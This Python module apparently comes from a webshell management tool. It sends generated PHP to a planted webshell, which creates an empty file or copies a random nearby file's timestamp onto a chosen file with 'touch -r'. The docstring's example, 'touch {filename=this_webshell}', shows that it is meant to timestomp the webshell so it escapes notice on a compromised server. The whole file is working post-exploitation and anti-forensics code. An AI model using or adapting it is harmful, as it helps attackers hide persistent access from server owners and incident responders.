from re import match

from libs.config import alias, color
from libs.myapp import send, get_system_code


def get_php(filename, command):
    return """$arr = glob("*.*");
$reference = $arr[mt_rand(0, count($arr) - 1)];
$file='%s';
if ($file==''){$file=basename($_SERVER['SCRIPT_NAME']);}
if (file_exists($file)){%s
echo $file.' as '.$reference;} else{
print(file_put_contents($file,''));}
""" % (filename, command)


@alias(True, _type="FILE", func_alias="t", f="filename")
def run(filename: str = ""):
    """
    touch

    Create an empty file or (Only for *unix) Specify a file whose modification time stamp is the same as a random file in the current directory.

    eg: touch {filename=this_webshell}
    """
    command = get_system_code("touch -r $reference $file", False)
    res = send(get_php(filename, command))
    if (not res):
        return
    text = res.r_text.strip()
    if (match(r"\d+", text)):
        print(color.green(f"\nSuccessfully created an empty file {filename}.\n"))
    elif ("No system execute function" in text):
        print(color.red(text))
    elif (len(text) > 0):
        print(color.green(f"\nModify time stamp {text} success\n"))
